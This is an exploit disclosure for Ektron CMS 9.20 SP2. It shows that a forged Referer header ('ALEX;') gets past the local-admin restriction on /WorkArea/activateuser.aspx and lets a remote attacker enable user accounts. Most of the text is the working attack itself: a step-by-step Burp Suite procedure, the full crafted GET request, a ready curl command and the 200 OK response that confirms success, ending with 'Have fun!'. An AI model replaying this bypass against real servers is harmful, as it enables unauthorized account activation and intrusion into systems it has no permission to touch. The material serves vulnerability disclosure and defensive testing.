CWE-284

Description
================
Ektron CMS 9.20 SP2 allows remote attackers to enable users.

Vulnerability
================
Ektron CMS 9.20 SP2 allows remote attackers to call aspx pages via the "activateuser.aspx" page, even if a page
is located under the /WorkArea/ path, which is forbidden (normally available exclusively for local admins).

Proof of concept Exploit
========================

Pre-requisites:

- curl command deployed (Windows or Linux)
- Burpsuite Free/Pro deployed or any other WebProxy to catch/send GET request

Step (1): Launch the BurpSuite with default paramenter then request the follwing URL:

Target: https://ektronserver.com/WorkArea/activateuser.aspx

Normally you will see a 403 Forbidden: Access denied.

Step (2): Into BurpSuite Free/Pro add the following extra Header Referer:

"Referer: ALEX;"

Step (3): The offending GET request is:

GET /WorkArea/activateuser.aspx HTTP/1.1
Host: ektronserver.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0
Referer: ALEX;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

Step (4): Test your GET request using curl command and burpsuite as following:

# curl -i -s -k -XGET "https://ektronserver.com/WorkArea/activateuser.aspx"
-H "Host: ektronserver.com"
-H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0"
-H "Referer: ALEX;"
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-H "Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate"
-H "Connection: close"
--proxy http://127.0.0.1:8080

You should see now the following response 200 OK!:

HTTP/1.0 200 Connection established

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8

Now you got access to enable users, just send the repeat request into the browser using burpsuite

Have fun!
